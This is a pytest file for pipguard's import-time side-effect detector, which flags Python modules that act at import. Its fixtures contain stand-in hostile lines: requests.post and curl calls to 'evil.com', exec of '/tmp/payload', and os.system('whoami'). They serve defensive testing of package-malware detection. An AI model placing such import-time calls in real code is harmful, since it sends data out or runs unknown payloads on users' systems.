"""Tests for import_time_detector."""

import tempfile
from pathlib import Path

from pipguard.detectors.import_time_detector import detect_import_time


def _write_py(content: str) -> Path:
    f = tempfile.NamedTemporaryFile(suffix=".py", mode="w", delete=False)
    f.write(content)
    f.close()
    return Path(f.name)


class TestImportTimeDetector:
    def test_clean_module_no_findings(self):
        path = _write_py("def hello():\n    return 'hi'\n")
        findings = detect_import_time(path)
        assert findings == []

    def test_top_level_requests_post(self):
        path = _write_py("import requests\nrequests.post('http://evil.com', data={})\n")
        findings = detect_import_time(path)
        assert len(findings) >= 1
        assert findings[0].rule_id == "IMPORT-TIME-SIDE-EFFECT"

    def test_top_level_subprocess(self):
        path = _write_py("import subprocess\nsubprocess.run(['curl', 'http://evil.com'])\n")
        findings = detect_import_time(path)
        assert len(findings) >= 1

    def test_top_level_exec(self):
        path = _write_py("exec(open('/tmp/payload').read())\n")
        findings = detect_import_time(path)
        assert len(findings) >= 1

    def test_function_body_not_flagged(self):
        code = "import requests\n\ndef do_thing():\n    requests.post('http://api.com')\n"
        path = _write_py(code)
        findings = detect_import_time(path)
        assert findings == []

    def test_top_level_os_system(self):
        path = _write_py("import os\nos.system('whoami')\n")
        findings = detect_import_time(path)
        assert len(findings) >= 1

    def test_top_level_assignment_call(self):
        path = _write_py("import requests\nresp = requests.post('http://evil.com')\n")
        findings = detect_import_time(path)
        assert len(findings) >= 1
